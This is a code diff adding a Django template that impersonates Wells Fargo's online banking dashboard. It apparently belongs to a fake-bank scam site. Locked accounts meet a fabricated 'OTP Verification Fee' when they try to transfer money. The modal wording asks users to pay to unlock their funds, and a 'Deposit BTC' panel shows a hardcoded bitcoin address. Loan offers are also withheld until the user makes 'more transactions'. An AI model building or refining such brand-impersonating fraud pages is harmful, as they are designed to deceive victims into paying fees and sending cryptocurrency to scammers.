@@ -1,0 +1,1371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Summary - Wells Fargo</title>
+    <!-- Font Awesome for sleek modern application iconography -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* --- DESIGN SYSTEM & LAYOUT VARIABLES --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        :root {
+            --wf-red: #D71E28;
+            --wf-gold: #FAD105;
+            --wf-dark-red: #8C1D24;
+            --text-dark: #333333;
+            --text-muted: #666666;
+            --bg-canvas: #F4F0EB;
+            --bg-card: #FFFFFF;
+            --border-color: #D6D1CA;
+            --success-green: #128807;
+        }
+
+        body {
+            background-color: var(--bg-canvas);
+            color: var(--text-dark);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        a {
+            text-decoration: none;
+            color: #0066CC;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* --- SECURE APPS HEADER --- */
+        header {
+            background-color: var(--wf-red);
+            border-bottom: 4px solid var(--wf-gold);
+            color: #FFFFFF;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 14px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .brand-logo {
+            font-size: 22px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .header-controls {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            font-size: 14px;
+        }
+
+        .user-welcome-tag {
+            font-weight: bold;
+        }
+
+        .header-profile-pic{
+    width:32px;
+    height:32px;
+    border-radius:50%;
+    object-fit:cover;
+    vertical-align:middle;
+    margin-right:8px;
+}
+
+        .btn-signout {
+            background-color: rgba(0, 0, 0, 0.2);
+            color: #FFFFFF;
+            border: 1px solid rgba(255,255,255,0.4);
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-signout:hover {
+            background-color: rgba(0,0,0,0.4);
+            text-decoration: none;
+        }
+
+        .mobile-hamburger {
+            display: none;
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        /* --- APP ARCHITECTURE GRID CONTAINER --- */
+        .dashboard-wrapper {
+            max-width: 1200px;
+            width: 100%;
+            margin: 85px auto 40px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 8fr 4fr; /* Balanced Content / Right Side Widget Bar split */
+            gap: 25px;
+        }
+
+        /* --- BANNER ALERTS --- */
+        .welcome-hero-strip {
+            grid-column: span 2;
+            background: linear-gradient(135deg, #A82027 0%, #701216 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+        }
+
+        .welcome-meta h2 {
+            font-size: 26px;
+            font-weight: normal;
+            margin-bottom: 6px;
+        }
+        .welcome-meta p {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+
+        .security-stamp {
+            text-align: right;
+            font-size: 13px;
+            background: rgba(255,255,255,0.15);
+            padding: 10px 15px;
+            border-radius: 6px;
+            border-left: 3px solid var(--wf-gold);
+        }
+
+        /* --- CENTRAL ACCOUNT PORTFOLIO ENGINE --- */
+        .main-content-column {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+
+        .dashboard-card {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.04);
+            overflow: hidden;
+        }
+
+        .card-header-bar {
+            background-color: #F9F7F5;
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .card-header-bar h3 {
+            font-size: 16px;
+            color: #222222;
+            font-weight: bold;
+        }
+
+        /* Account Entry Item Rows */
+        .account-row-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid #EFECE8;
+            transition: background-color 0.15s;
+        }
+        .account-row-item:last-child {
+            border-bottom: none;
+        }
+        .account-row-item:hover {
+            background-color: #FCFAF7;
+        }
+
+        .account-identity-block h4 {
+            font-size: 16px;
+            color: #0066CC;
+            margin-bottom: 4px;
+            cursor: pointer;
+        }
+        .account-identity-block h4:hover {
+            text-decoration: underline;
+        }
+        .account-num-mask {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .account-balances-block {
+            text-align: right;
+        }
+        .balance-figure {
+            font-size: 18px;
+            font-weight: bold;
+            color: #111111;
+        }
+        .balance-label {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        /* Total Portfolio Aggregator Section */
+        .portfolio-summary-ribbon {
+            background-color: #F1ECE6;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 40px;
+            font-size: 14px;
+            border-top: 1px solid var(--border-color);
+        }
+        .portfolio-summary-ribbon strong {
+            font-size: 16px;
+        }
+
+        /* --- SIDEBAR WIDGET SYSTEM --- */
+        .sidebar-column {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+
+        /* Quick Transfer Widget */
+        .transfer-widget-body {
+            padding: 20px;
+        }
+
+        .form-select-group {
+            margin-bottom: 15px;
+        }
+        .form-select-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+        .form-select-group select, .form-select-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #FFFFFF;
+            color: var(--text-dark);
+            outline: none;
+        }
+        .form-select-group select:focus, .form-select-group input:focus {
+            border-color: #333333;
+        }
+
+        .btn-transfer-submit {
+            width: 100%;
+            background-color: var(--wf-gold);
+            color: var(--text-dark);
+            border: 1px solid #D4B000;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-transfer-submit:hover {
+            background-color: #E2BC03;
+        }
+
+        /* Financial Summary Visual Graph Mock */
+        .chart-mock-box {
+            padding: 20px;
+            text-align: center;
+        }
+        .donut-chart-simulation {
+            width: 130px;
+            height: 130px;
+            border-radius: 50%;
+            background: conic-gradient(#D71E28 0% 65%, #FAD105 65% 85%, #128807 85% 100%);
+            margin: 15px auto;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .donut-chart-center-cutout {
+            width: 85px;
+            height: 85px;
+            background-color: #FFFFFF;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .chart-legend-list {
+            list-style: none;
+            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            font-size: 12px;
+        }
+        .legend-bullet-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .legend-dot { width: 10px; height: 10px; border-radius: 50%; }
+
+        /* --- COMPLIANCE FOOTER --- */
+        footer {
+            background-color: #EAE5DF;
+            border-top: 1px solid var(--border-color);
+            padding: 30px 20px;
+            margin-top: auto;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: left;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px 15px;
+            margin-bottom: 15px;
+        }
+        .footer-links a {
+            color: #444444;
+        }
+
+        .action-btn{
+    width:100%;
+    border:none;
+    padding:15px;
+    margin-bottom:12px;
+    border-radius:10px;
+    cursor:pointer;
+    font-size:15px;
+    font-weight:600;
+    display:flex;
+    align-items:center;
+    gap:12px;
+    background:#f8f8f8;
+    transition:.3s;
+}
+
+.action-btn:hover{
+    background:#ececec;
+}
+
+.action-btn i{
+    color:var(--wf-red);
+    font-size:18px;
+}
+
+        /* --- RESPONSIVE ENGINE VIEWPORTS --- */
+        @media (max-width: 992px) {
+            .dashboard-wrapper {
+                grid-template-columns: 1fr; /* Stacks column sections cleanly */
+                margin-top: 75px;
+            }
+            .welcome-hero-strip {
+                grid-column: span 1;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+            .security-stamp {
+                text-align: left;
+                width: 100%;
+            }
+        }
+
+       @media (max-width: 600px) {
+
+    .welcome-text{
+        display:none;
+    }
+
+    .user-welcome-tag{
+        display:flex;
+        align-items:center;
+    }
+
+    .header-profile-pic{
+        width:36px;
+        height:36px;
+        margin-right:0;
+    }
+
+    .account-row-item{
+        flex-direction:column;
+        align-items:flex-start;
+        gap:12px;
+    }
+
+    .account-balances-block{
+        text-align:left;
+    }
+
+    .portfolio-summary-ribbon{
+        flex-direction:column;
+        gap:8px;
+        align-items:flex-start;
+    }
+
+    .footer-links{
+        display:grid;
+        grid-template-columns:1fr 1fr;
+    }
+}
+
+        .modal{
+    display:none;
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(0,0,0,.5);
+    z-index:5000;
+}
+
+.modal-content{
+    background:white;
+    width:90%;
+    max-width:500px;
+    margin:100px auto;
+    border-radius:12px;
+    overflow:hidden;
+}
+
+.modal-header{
+    background:var(--wf-red);
+    color:white;
+    padding:15px 20px;
+    display:flex;
+    justify-content:space-between;
+}
+
+.modal-header span{
+    cursor:pointer;
+    font-size:24px;
+}
+
+.modal-content form{
+    padding:20px;
+}
+
+.modal-content input{
+    width:100%;
+    margin-bottom:15px;
+    padding:12px;
+    border:1px solid #ddd;
+    border-radius:8px;
+}
+
+.modal-content button{
+    width:100%;
+    background:var(--wf-red);
+    color:white;
+    border:none;
+    padding:14px;
+    border-radius:8px;
+    cursor:pointer;
+}
+
+/* CARDS */
+.card{
+    background:white;
+    border-radius:12px;
+    padding:20px;
+    box-shadow:0 4px 12px rgba(0,0,0,0.05);
+}
+
+/* ACCOUNT */
+.account{
+    display:flex;
+    justify-content:space-between;
+    padding:15px 0;
+    border-bottom:1px solid #eee;
+}
+
+/* BUTTON */
+.btn{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:10px;
+    cursor:pointer;
+    font-weight:bold;
+}
+
+.btn-primary{
+    background:#FAD105;
+}
+
+.btn-primary:hover{
+    background:#e6c200;
+}
+
+/* QUICK ACTION */
+.quick-action{
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+}
+
+.quick-btn{
+    background:#D71E28;
+    color:white;
+    padding:12px;
+    border:none;
+    border-radius:10px;
+    cursor:pointer;
+    font-weight:bold;
+}
+
+/* TRANSACTION HISTORY */
+.txn-row{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    padding:14px 15px;
+    border-left:4px solid #ccc;
+    border-bottom:1px solid #f0f0f0;
+    background:#fff;
+    transition:background 0.15s ease;
+}
+
+.txn-row:hover{
+    background:#fafafa;
+}
+
+.txn-row.status-successful{
+    border-left-color:#1a9c4a;
+    background:#f2fbf5;
+}
+
+.txn-row.status-pending{
+    border-left-color:#e8a33d;
+    background:#fffaf1;
+}
+
+.txn-row.status-failed{
+    border-left-color:#d64545;
+    background:#fdf3f3;
+}
+
+.txn-icon{
+    flex:0 0 auto;
+    width:38px;
+    height:38px;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:15px;
+    color:#fff;
+}
+
+.txn-icon.status-successful{ background:#1a9c4a; }
+.txn-icon.status-pending{ background:#e8a33d; }
+.txn-icon.status-failed{ background:#d64545; }
+
+.txn-body{
+    flex:1 1 auto;
+    min-width:0;
+}
+
+.txn-type-tag{
+    display:inline-block;
+    font-size:10px;
+    font-weight:bold;
+    text-transform:uppercase;
+    letter-spacing:0.5px;
+    background:#eee;
+    color:#555;
+    padding:2px 7px;
+    border-radius:4px;
+    margin-right:8px;
+    vertical-align:middle;
+}
+
+.txn-message{
+    font-weight:600;
+    color:#1a1a1a;
+    font-size:15px;
+    line-height:1.3;
+}
+
+.txn-date{
+    font-size:12px;
+    color:#888;
+    margin-top:2px;
+    display:block;
+}
+
+.txn-amount{
+    flex:0 0 auto;
+    text-align:right;
+    font-weight:bold;
+    font-size:16px;
+    white-space:nowrap;
+}
+
+.txn-amount.status-successful{ color:#1a9c4a; }
+.txn-amount.status-pending{ color:#e8a33d; }
+.txn-amount.status-failed{ color:#d64545; }
+
+.txn-status-label{
+    display:block;
+    font-size:11px;
+    font-weight:normal;
+    margin-top:2px;
+}
+
+.txn-status-label.status-successful{ color:#1a9c4a; }
+.txn-status-label.status-pending{ color:#e8a33d; }
+.txn-status-label.status-failed{ color:#d64545; }
+
+    </style>
+</head>
+<body>
+
+    <!-- SECURE APPLICATION NAV SYSTEM -->
+    <header>
+        <div class="header-container">
+            <div class="brand-logo">Wells Fargo</div>
+            <div class="header-controls">
+               <span class="user-welcome-tag">
+
+    {% if profile.profile_picture %}
+        <img
+            src="{{ profile.profile_picture.url }}"
+            class="header-profile-pic"
+        >
+    {% endif %}
+
+    <span class="welcome-text">
+        Welcome, {{ profile.full_name }}
+    </span>
+
+</span>
+               <form id="logoutForm"
+      method="POST"
+      action="{% url 'logout' %}"
+      style="display:inline;">
+
+    {% csrf_token %}
+
+    <button type="button"
+            class="btn-signout"
+            onclick="confirmLogout()">
+        Sign Out
+    </button>
+
+</form>
+            </div>
+        </div>
+    </header>
+
+    <!-- CORE TRANSACTION VIEWPORT CONTEXT -->
+    <main class="dashboard-wrapper">
+        
+        <!-- BANNER WELCOME ROW -->
+        <section class="welcome-hero-strip">
+            <div class="welcome-meta">
+                <h2>Hi, {{ profile.full_name }}</h2>
+                <p>Your security profile is up to date. Welcome back to your secure banking session.</p>
+            </div>
+            <div class="security-stamp">
+                <i class="fa-solid fa-shield-halved" style="color: var(--wf-gold)"></i> 
+                <strong>Online</strong>
+            </div>
+        </section>
+
+        <!-- PRIMARY ACCOUNTS MATRIX COLUMN -->
+        <section class="main-content-column">
+            
+            <!-- CARD 1: BANKING DEPOSITS -->
+            <div class="dashboard-card">
+                <div class="card-header-bar">
+                    <h3>Banking Accounts</h3>
+                    <!-- <a href="#" class="header-action-link">View Details</a> -->
+                </div>
+                
+                <!-- Account Box 1 -->
+            <div class="account-row-item">
+    <div class="account-identity-block">
+        <h4>{{ profile.full_name }}</h4>
+
+        <span class="account-num-mask">
+            Account Number:
+            {{ profile.account_number }}
+        </span>
+    </div>
+
+    <div class="account-balances-block">
+        <div class="balance-figure">
+            {{ profile.currency_symbol }}{{ profile.balance }}
+        </div>
+
+        <div class="balance-label">
+            Available Balance
+        </div>
+    </div>
+</div>
+ <!-- RIGHT -->
+    <div class="card">
+
+        <h3></h3>
+
+        <div class="quick-action">
+
+            <!-- THIS IS THE IMPORTANT BUTTON -->
+            <button class="quick-btn" onclick="openTransferModal()">
+                <i class="fa fa-paper-plane"></i> Transfer Money
+            </button>
+
+            <button class="quick-btn" onclick="openDepositModal()">
+    <i class="fa fa-btc"></i> Deposit BTC
+</button>
+
+           <a href="{% url 'edit_pin' %}">
+        <button
+            type="button"
+            class="quick-btn"
+            style="background:#444;"
+        >
+            <i class="fa fa-key"></i>
+            Edit PIN
+        </button>
+    </a>
+
+        </div>
+
+    </div>
+
+</div>
+                <!-- Sub-total Aggregator Layout -->
+                <div class="portfolio-summary-ribbon">
+                    <div>Total Deposit Balance:</div>
+                    <div><strong>{{ profile.currency_symbol }}{{ profile.balance }}</strong></div>
+                </div>
+            </div>
+
+            <!-- CARD 2: CREDIT CARDS & LOANS -->
+            <div class="dashboard-card">
+                <div class="card-header-bar">
+                    <h3>Credit Cards & Loans</h3>
+                   
+                </div>
+
+                <!-- Account Box 3 -->
+                <div class="account-row-item">
+                    <div class="account-identity-block">
+                        <h4 onclick="serviceNotEligible()">
+                    Active Cash® Card
+                </h4>
+                        <span class="account-num-mask"></span>
+                    </div>
+                    <div class="account-balances-block">
+                        <div class="balance-figure" style="color: #A82027;"></div>
+                        <div class="balance-label"></div>
+                    </div>
+                </div>
+
+                <!-- Account Box 4 -->
+                <div class="account-row-item">
+                    <div class="account-identity-block">
+                        <h4 onclick="serviceNotEligible()">
+                        Home Mortgage Loan
+                    </h4>
+                        <span class="account-num-mask"></span>
+                    </div>
+                    <div class="account-balances-block">
+                        <div class="balance-figure"></div>
+                        <div class="balance-label"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="dashboard-card">
+    <div class="card-header-bar">
+        <h3>Transaction History</h3>
+    </div>
+
+    {% for t in transactions %}
+    <div class="txn-row status-{{ t.status }}">
+
+        <div class="txn-icon status-{{ t.status }}">
+            <i class="fa {{ t.icon }}"></i>
+        </div>
+
+        <div class="txn-body">
+            <div class="txn-message">
+                <span class="txn-type-tag">{{ t.type }}</span>
+                {% if t.message %}
+                    {{ t.message }}
+                {% else %}
+                    {{ t.type }}
+                {% endif %}
+            </div>
+            <span class="txn-date">{{ t.created_at }}</span>
+        </div>
+
+        <div class="txn-amount status-{{ t.status }} {{ t.direction }}">
+            {% if t.direction == "in" %}+{% else %}-{% endif %}{{ profile.currency_symbol }}{{ t.amount }}
+
+            <span class="txn-status-label status-{{ t.status }}">
+                {% if t.status == "pending" and t.type == "OTP Verification Fee" %}
+                    OTP Verification Fee Pending
+                {% elif t.status == "pending" %}
+                    Pending
+                {% elif t.status == "successful" %}
+                    Successful
+                {% else %}
+                    Failed
+                {% endif %}
+            </span>
+        </div>
+
+    </div>
+    {% empty %}
+        <p style="padding:15px;">No transactions yet</p>
+    {% endfor %}
+</div>
+
+        </section>
+        
+
+        <!-- RIGHT SIDEBAR APP CONTAINER -->
+        <section class="sidebar-column">
+            
+            <!-- QUICK TRANSFER TOOL -->
+          
+
+            <!-- ASSET BALANCE METRICS CHART -->
+            <div class="dashboard-card">
+                <div class="card-header-bar">
+                    <h3>Asset Distribution Breakdown</h3>
+                </div>
+                <div class="chart-mock-box">
+                    <div class="donut-chart-simulation">
+                        <div class="donut-chart-center-cutout">
+                            <span style="font-size: 11px; color: var(--text-muted);">Total Assets</span>
+                            <strong style="font-size: 15px; margin-top: 2px;">
+    {{ profile.currency_symbol }}{{ profile.balance }}
+</strong>
+                        </div>
+                    </div>
+                    
+                    <ul class="chart-legend-list">
+                        <li class="legend-bullet-item">
+                            <span class="legend-dot" style="background-color: #D71E28;"></span> Checking (%)
+                        </li>
+                        <li class="legend-bullet-item">
+                            <span class="legend-dot" style="background-color: #FAD105;"></span> Savings (%)
+                        </li>
+                        <li class="legend-bullet-item">
+                            <span class="legend-dot" style="background-color: #128807;"></span> Other (%)
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+        </section>
+
+    </main>
+
+    <!-- SYSTEM FOOTER LEGALS -->
+    <footer>
+        <div class="footer-container">
+            <div class="footer-links">
+                <a href="#">About Wells Fargo</a>
+                <a href="#">Privacy, Cookies, Security & Legal</a>
+                <a href="#">Notice of Data Collection</a>
+                <a href="#">Online Access Agreement</a>
+                <a href="#">Contact Us</a>
+            </div>
+            <p>© 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801. Equal Housing Lender.</p>
+        </div>
+    </footer>
+
+    <!-- INTERACTION LOGIC CONTROL SCRIPT -->
+    <script>
+        function executeQuickTransfer(event) {
+            event.preventDefault();
+            const fromAccount = document.getElementById('transferFrom').value;
+            const toAccount = document.getElementById('transferTo').value;
+            const amount = document.getElementById('transferAmount').value;
+
+            if (fromAccount === toAccount) {
+                alert("Source and Destination accounts cannot be identical.");
+                return;
+            }
+
+            alert(`Funds Transfer Request Processed Successfully!\n\nAmount: $${amount}\nFrom: Account [${fromAccount}]\nTo: Account [${toAccount}]`);
+            document.getElementById('quickTransferForm').reset();
+        }
+
+        function confirmLogout() {
+            if (
+                confirm(
+                    "Are you sure you want to securely close your active online banking session?"
+                    )
+            ){
+                document.getElementById(
+                    "logoutForm"
+                    ).submit();
+                
+            }
+
+        }
+
+        
+    </script>
+<script>
+function openTransferModal(){
+    document.getElementById('transferModal').style.display='block';
+}
+
+function closeTransferModal(){
+    document.getElementById('transferModal').style.display='none';
+}
+
+window.onclick = function(event){
+    let modal = document.getElementById('transferModal');
+
+    if(event.target === modal){
+        modal.style.display='none';
+    }
+}
+</script>
+<script>
+
+function showVerificationMessage(){
+
+    closeTransferModal();
+
+    document.getElementById(
+        "otpModal"
+    ).style.display = "block";
+
+}
+
+function continueTransfer(){
+
+    let form = document.getElementById("transferForm");
+
+    if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+    }
+
+    let formData = new FormData(form);
+    let isLocked = {{ profile.transfer_locked|yesno:"true,false" }};
+
+    fetch("{% url 'create_transfer' %}", {
+        method: "POST",
+        body: formData
+    })
+    .then(function(){
+
+        if (isLocked) {
+            // still needs OTP verification before transfers are allowed
+            showVerificationMessage();
+        } else {
+            // already verified previously — go straight through
+            closeTransferModal();
+            form.reset();
+            document.getElementById(
+                "transferSuccessModal"
+            ).style.display = "block";
+        }
+
+    })
+    .catch(function(){
+        if (isLocked) {
+            showVerificationMessage();
+        }
+    });
+
+}
+
+function closeTransferSuccessModal(){
+
+    document.getElementById(
+        "transferSuccessModal"
+    ).style.display = "none";
+
+    // reload so the balance and transaction history reflect the new transfer
+    window.location.reload();
+
+}
+
+function closeOtpModal(){
+
+    document.getElementById(
+        "otpModal"
+    ).style.display = "none";
+
+}
+
+function payVerificationFee(){
+
+    closeOtpModal();
+
+    document.getElementById(
+        "processingModal"
+    ).style.display = "block";
+
+    setTimeout(function(){
+        document.getElementById(
+            "verificationFeeForm"
+        ).submit();
+    }, 2000);
+
+}
+
+function serviceNotEligible(){
+
+    document.getElementById(
+        "serviceModal"
+    ).style.display = "block";
+
+}
+
+function closeServiceModal(){
+
+    document.getElementById(
+        "serviceModal"
+    ).style.display = "none";
+
+}
+
+function openDepositModal(){
+    document.getElementById("depositModal").style.display = "block";
+}
+
+function closeDepositModal(){
+    document.getElementById("depositModal").style.display = "none";
+}
+
+
+
+</script>
+
+    <div id="transferModal" class="modal">
+
+    <div class="modal-content">
+
+        <div class="modal-header">
+            <h3>Transfer To Bank Account</h3>
+            <span onclick="closeTransferModal()">&times;</span>
+        </div>
+
+      <form id="transferForm">
+
+    {% csrf_token %}
+
+    <input
+        type="text"
+        name="bank_name"
+        placeholder="Bank Name"
+        required
+    >
+
+    <input
+        type="text"
+        name="account_number"
+        placeholder="Account Number"
+        required
+    >
+
+    <input
+        type="text"
+        name="account_name"
+        placeholder="Account Name"
+        required
+    >
+
+    <input
+        type="number"
+        name="amount"
+        placeholder="Amount"
+        required
+    >
+
+    {% if profile.transfer_locked %}
+
+<button type="button"
+        onclick="continueTransfer()">
+
+    Continue Transfer
+
+</button>
+
+{% else %}
+
+<button
+    type="button"
+    onclick="continueTransfer()"
+>
+    Send Transfer
+</button>
+
+{% endif %}
+
+</form>
+
+    </div>
+
+</div>
+
+<div id="otpModal" class="modal">
+
+    <div class="modal-content">
+
+        <div class="modal-header">
+            <h3>OTP Verification Required</h3>
+            <span onclick="closeOtpModal()">&times;</span>
+        </div>
+
+        <div style="padding:20px;text-align:center;">
+
+            <i class="fa fa-lock"
+               style="font-size:50px;color:#D71E28;"></i>
+
+            <h2 style="margin-top:15px;">
+                Unlock OTP Verification
+            </h2>
+
+            <p style="margin-top:10px;">
+                Your account requires OTP activation before transfers can be completed.
+            </p>
+
+            <div style="
+                background:#fff3cd;
+                padding:15px;
+                border-radius:8px;
+                margin-top:20px;
+                font-size:18px;
+                font-weight:bold;
+            ">
+                Verification Fee:
+                {{ profile.currency_symbol }}{{ profile.verification_fee }}
+            </div>
+
+            <button
+                style="
+                    margin-top:20px;
+                    width:100%;
+                    background:#D71E28;
+                    color:white;
+                    border:none;
+                    padding:14px;
+                    border-radius:8px;
+                    cursor:pointer;
+                "
+                onclick="payVerificationFee()"
+            >
+                Pay Verification Fee
+            </button>
+
+        </div>
+
+    </div>
+
+</div>
+
+<!-- hidden form used to actually record the verification fee payment -->
+<form
+    id="verificationFeeForm"
+    method="POST"
+    action="{% url 'pay_verification_fee' %}"
+    style="display:none;"
+>
+    {% csrf_token %}
+</form>
+
+<div id="processingModal" class="modal">
+
+    <div class="modal-content" style="text-align:center;padding:30px;">
+
+        <i class="fa fa-spinner fa-spin" style="font-size:40px;color:#D71E28;"></i>
+
+        <h3 style="margin-top:15px;">Processing Payment</h3>
+
+        <p style="margin-top:10px;">
+            Please wait while we process your OTP verification fee...
+        </p>
+
+    </div>
+
+</div>
+
+<div id="transferSuccessModal" class="modal">
+
+    <div class="modal-content" style="text-align:center;padding:30px;">
+
+        <i class="fa fa-circle-check" style="font-size:40px;color:#1a9c4a;"></i>
+
+        <h3 style="margin-top:15px;">Transfer Successful</h3>
+
+        <p style="margin-top:10px;">
+            Your transfer has been completed successfully and will
+            appear in your transaction history.
+        </p>
+
+        <button
+            onclick="closeTransferSuccessModal()"
+            style="
+                margin-top:20px;
+                width:100%;
+                background:#D71E28;
+                color:white;
+                border:none;
+                padding:14px;
+                border-radius:8px;
+                cursor:pointer;
+            "
+        >
+            Done
+        </button>
+
+    </div>
+
+</div>
+
+<!-- active loans-->
+ <div id="serviceModal" class="modal">
+
+    <div class="modal-content">
+
+        <div class="modal-header">
+            <h3>Service Unavailable</h3>
+            <span onclick="closeServiceModal()">&times;</span>
+        </div>
+
+        <div style="padding:25px;text-align:center;">
+
+            <i class="fa fa-circle-info"
+               style="font-size:60px;color:#D71E28;"></i>
+
+            <h2 style="margin-top:15px;">
+                Hi, {{ profile.full_name }}
+            </h2>
+
+            <p style="
+                margin-top:15px;
+                color:#555;
+                line-height:1.6;
+            ">
+                You are currently not eligible to access this service.
+                <br><br>
+                Carry out more transactions to enable access to
+                credit cards, mortgage loans.
+            </p>
+
+            <button
+                onclick="closeServiceModal()"
+                style="
+                    margin-top:20px;
+                    width:100%;
+                    background:#D71E28;
+                    color:white;
+                    border:none;
+                    padding:14px;
+                    border-radius:8px;
+                    cursor:pointer;
+                    font-weight:bold;
+                ">
+                Understood
+            </button>
+
+        </div>
+
+    </div>
+
+</div>
+
+<!-- transfer -->
+ <div id="depositModal" class="modal">
+
+    <div class="modal-content">
+
+        <div class="modal-header">
+            <h3>BTC Deposit</h3>
+            <span onclick="closeDepositModal()">&times;</span>
+        </div>
+
+        <div style="padding:20px;text-align:center;">
+
+            <h3>Send Bitcoin to this Address</h3>
+
+            <p style="margin-top:10px;font-weight:bold;word-break:break-all;">
+                {{ deposit_address|default:"bc1qm9qlahgkrmh0xt92t0ny0p5m568pyn5c6n4l9z" }}
+            </p>
+
+            <!-- QR CODE IMAGE -->
+            {% if settings and settings.btc_qr %}
+    <img src="{{ settings.btc_qr.url }}" style="width:200px;margin-top:15px;">
+{% endif %}
+
+            <p style="margin-top:15px;color:#555;">
+                Send BTC and then enter amount below
+            </p>
+
+            <form method="POST" action="{% url 'deposit' %}">
+                {% csrf_token %}
+
+                <input type="number"
+                       name="amount"
+                       placeholder="Enter Amount Deposited"
+                       required
+                       style="width:100%;padding:12px;margin-top:10px;">
+
+                <button type="submit"
+                        style="margin-top:15px;width:100%;background:#D71E28;color:white;padding:12px;border:none;border-radius:8px;">
+                    I Have Paid
+                </button>
+            </form>
+
+        </div>
+
+    </div>
+
+</div>
+</body>
+</html>
